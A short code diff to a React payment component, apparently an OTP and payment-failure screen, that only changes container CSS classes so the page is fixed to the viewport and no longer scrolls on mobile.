@@ -158,7 +158,7 @@ const RocketPayment = () => {
 
   if (showOtp) {
     return (
-      <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
+      <div className="fixed inset-0 bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden overscroll-none touch-none">
         <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}
           <div className="px-3 min-[375px]:px-4 py-3 min-[375px]:py-4">
@@ -189,7 +189,7 @@ const RocketPayment = () => {
 
   if (showFailed) {
     return (
-      <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
+      <div className="fixed inset-0 bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden overscroll-none touch-none">
         <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}{gatewayBanner}
           <div className="p-4 min-[375px]:p-6 text-center">
@@ -204,7 +204,7 @@ const RocketPayment = () => {
   }
 
   return (
-    <div className="h-screen bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden">
+    <div className="fixed inset-0 bg-[#f0f0f0] flex items-start justify-center px-4 pt-4 overflow-hidden overscroll-none touch-none">
       <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
         {header}{gatewayBanner}
         <div className="px-3 min-[375px]:px-4 py-3 min-[375px]:py-4">
